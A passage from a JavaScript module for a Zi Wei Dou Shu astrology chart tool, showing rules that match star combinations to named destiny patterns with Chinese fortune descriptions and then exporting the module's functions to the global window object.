        geJu.push({ name: huo + "贪格", desc: huo + "星贪狼同宫，主突发横财，威名远震，但亦主横祸，宜冒险投机。", level: "中上" });
    }
    if (stars.includes("禄存") && stars.includes("天马")) {
        geJu.push({ name: "禄马交驰格", desc: "禄存天马同宫或三方，主财禄丰厚，动中生财，宜外地发展。", level: "中上" });
    }
    const jiYueTongLiang = ["天机","太阴","天同","天梁"];
    const hasJiYue = jiYueTongLiang.filter(s => stars.includes(s)).length;
    if (hasJiYue >= 2) {
        const sanFang = getSanFang(gongWei, mingIdx);
        const sanFangStars = sanFang.flatMap(g => g.stars.map(s => s.name));
        const jiYueCount = jiYueTongLiang.filter(s => stars.includes(s) || sanFangStars.includes(s)).length;
        if (jiYueCount >= 3) {
            geJu.push({ name: "机月同梁格", desc: "天机太阴天同天梁会照，主文职清贵，宜公教职、秘书、参谋，名大于利。", level: "中上" });
        }
    }
    if (stars.includes("紫微") && (stars.includes("左辅") || stars.includes("右弼") || stars.includes("天魁") || stars.includes("天钺"))) {
        geJu.push({ name: "君臣庆会格", desc: "紫微会辅弼魁钺，主贵人扶持，事业有成，富贵双全，得人拥护。", level: "上等" });
    }
    if (stars.includes("太阴") && zhi === "卯") {
        geJu.push({ name: "明珠出海格", desc: "太阴在卯宫，对宫太阳在亥，主才华出众，名利双收，如明珠出海。", level: "上等" });
    }
    if (stars.includes("太阳") && stars.includes("天梁") && stars.includes("文昌")) {
        geJu.push({ name: "阳梁昌禄格", desc: "太阳天梁文昌同宫或会照，主学业有成，科举显达，文职清贵。", level: "上等" });
    }
    if (stars.includes("巨门") && ["子","午"].includes(zhi) && (stars.includes("禄存") || siHua.lu === "巨门")) {
        geJu.push({ name: "石中隐玉格", desc: "巨门在子午，有禄存或化禄，主才华内蕴，大器晚成，如石中隐玉。", level: "中上" });
    }
    if (stars.includes("天同") && zhi === "午" && stars.includes("擎羊")) {
        geJu.push({ name: "马头带箭格", desc: "天同擎羊在午宫，主武职显达，威震边疆，宜军警。", level: "中上" });
    }
    if (stars.includes("紫微") && zhi === "午") {
        geJu.push({ name: "极向离明格", desc: "紫微在午宫独坐，三方吉曜会照，主君临天下，大富大贵，权威极重。", level: "上等" });
    }
    if (stars.includes("巨门") && stars.includes("天机") && (siHua.lu === "巨门" || siHua.quan === "天机")) {
        geJu.push({ name: "巨机化格", desc: "巨门天机同宫化禄化权，主口才出众，宜律师、外交、演艺、传播。", level: "中上" });
    }
    const leftIdx = (mingIdx - 1 + 12) % 12;
    const rightIdx = (mingIdx + 1) % 12;
    const leftGong = gongWei.find(g => g.idx === leftIdx);
    const rightGong = gongWei.find(g => g.idx === rightIdx);
    if (leftGong && rightGong) {
        const leftStars = leftGong.stars.map(s => s.name);
        const rightStars = rightGong.stars.map(s => s.name);
        if (leftStars.includes("左辅") && rightStars.includes("右弼")) {
            geJu.push({ name: "左右夹命格", desc: "左辅右弼夹命宫，主贵人扶持，左右逢源，一生平顺，得人助。", level: "中上" });
        }
        if (leftStars.includes("天魁") && rightStars.includes("天钺")) {
            geJu.push({ name: "魁钺夹命格", desc: "天魁天钺夹命宫，主贵人提携，逢凶化吉，科举显达，名声好。", level: "上等" });
        }
        if (leftStars.includes("文昌") && rightStars.includes("文曲")) {
            geJu.push({ name: "昌曲夹命格", desc: "文昌文曲夹命宫，主才华出众，学业有成，文艺显达。", level: "上等" });
        }
        if ((leftStars.includes("火星") && rightStars.includes("铃星")) || (leftStars.includes("铃星") && rightStars.includes("火星"))) {
            geJu.push({ name: "火铃夹命格", desc: "火星铃星夹命宫，主性情急躁，一生多波折，宜武职，不宜文职。", level: "下等" });
        }
        if ((leftStars.includes("地空") && rightStars.includes("地劫")) || (leftStars.includes("地劫") && rightStars.includes("地空"))) {
            geJu.push({ name: "空劫夹命格", desc: "地空地劫夹命宫，主破财耗散，空想多成少，宜宗教艺术。", level: "下等" });
        }
    }
    const hasLu = gongWei.some(g => g.stars.some(s => s.name === "化禄"));
    const hasQuan = gongWei.some(g => g.stars.some(s => s.name === "化权"));
    const hasKe = gongWei.some(g => g.stars.some(s => s.name === "化科"));
    if (hasLu && hasQuan && hasKe) {
        geJu.push({ name: "三奇嘉会格", desc: "化禄化权化科在三方四正会照，主才华出众，富贵双全，声名远播。", level: "上等" });
    }
    if (hasLu && hasQuan) {
        geJu.push({ name: "权禄巡逢格", desc: "化禄化权同宫或会照，主财官双美，权柄在握，富贵双全。", level: "上等" });
    }
    if (stars.includes("禄存") && (stars.includes("文昌") || stars.includes("文曲"))) {
        geJu.push({ name: "禄文拱命格", desc: "禄存与昌曲同宫或会照，主才华富贵，名利双收。", level: "中上" });
    }
    if (stars.includes("天马") && (stars.includes("地空") || stars.includes("地劫"))) {
        geJu.push({ name: "马落空亡格", desc: "天马与空劫同宫，主奔波无功，财来财去，宜守不宜攻。", level: "下等" });
    }
    if (stars.includes("天相") && (stars.includes("擎羊") || stars.includes("陀罗"))) {
        geJu.push({ name: "刑囚夹印格", desc: "天相被羊陀夹或冲，主刑伤、疾病、官非，需防小人。", level: "下等" });
    }
    if (geJu.length === 0) {
        geJu.push({ name: "无特殊格局", desc: "命宫无显著格局，需结合大限流年及三方四正综合判断。", level: "平常" });
    }
    return geJu;
}

function getSanFang(gongWei, mingIdx) {
    const idx1 = (mingIdx + 4) % 12;
    const idx2 = (mingIdx + 8) % 12;
    return [gongWei.find(g => g.idx === idx1), gongWei.find(g => g.idx === idx2)].filter(Boolean);
}

// 暴露全局
window.MIAO_WANG = MIAO_WANG;
window.getMiaoWang = getMiaoWang;
window.getXiaoXian = getXiaoXian;
window.getLiuNianTaiSui = getLiuNianTaiSui;
window.getMingGongGeJu = getMingGongGeJu;
window.getSanFang = getSanFang;

window.paiZiWeiPan = paiZiWeiPan;
window.saveZiWeiHistory = saveZiWeiHistory;
window.loadZiWeiHistory = loadZiWeiHistory;
window.deleteZiWeiHistory = deleteZiWeiHistory;
window.clearZiWeiHistory = clearZiWeiHistory;
window.exportZiWeiHistory = exportZiWeiHistory;
window.GONG_NAME = GONG_NAME;
window.DI_ZHI = DI_ZHI;
window.TIAN_GAN = TIAN_GAN;
window.SI_HUA = SI_HUA;
window.ZHU_XING = ZHU_XING;
window.getYearGanZhi = getYearGanZhi;
window.GAN_YIN_YANG = GAN_YIN_YANG;
window.ZHI_IDX = ZHI_IDX;


})();